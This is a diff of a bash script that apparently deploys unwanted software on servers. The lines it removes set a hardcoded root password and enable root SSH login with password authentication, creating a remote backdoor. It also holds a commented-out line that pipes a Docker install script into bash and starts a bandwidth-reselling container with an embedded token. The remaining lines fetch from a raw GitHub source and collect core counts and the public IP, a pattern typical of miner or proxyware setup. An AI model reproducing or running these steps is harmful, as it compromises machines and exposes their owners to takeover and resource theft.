@@ -1,14 +1,4 @@
 #!/bin/bash
-echo root:Bbq.123456 |sudo chpasswd root
-sudo sed -i 's/^#\?Port.*/Port 22/g' /etc/ssh/sshd_config;
-sudo sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/g' /etc/ssh/sshd_config;
-sudo sed -i 's/^#\?PasswordAuthentication.*/PasswordAuthentication yes/g' /etc/ssh/sshd_config;
-sudo systemctl restart sshd
-sudo systemctl restart ssh
-###curl -fsSL https://get.docker.com | bash && docker run -d --restart=always --name tm traffmonetizer/cli_v2 start accept --token 1N6QqhaHnDyHYkx89vsxd+CNkoqoaqXT37Fj0baANRA=
-
-
-
 mode="${1:-0}"
 src="https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main"
 
@@ -16,7 +6,7 @@ src="https://raw.githubusercontent.com/curiosityinteriorsuk/2088/main"
 sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
 sudo apt -qqy install wget nload icu-devtools >/dev/null 2>&1 || apt -qqy install wget nload icu-devtools >/dev/null 2>&1
 
-########cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
+cores=`grep 'siblings' /proc/cpuinfo 2>/dev/null |cut -d':' -f2 | head -n1 |grep -o '[0-9]\+'`
 [ -n "$cores" ] || cores=1
 addr=`wget --no-check-certificate -4 -qO- http://checkip.amazonaws.com/ 2>/dev/null`
 [ -n "$addr" ] || addr="NULL"
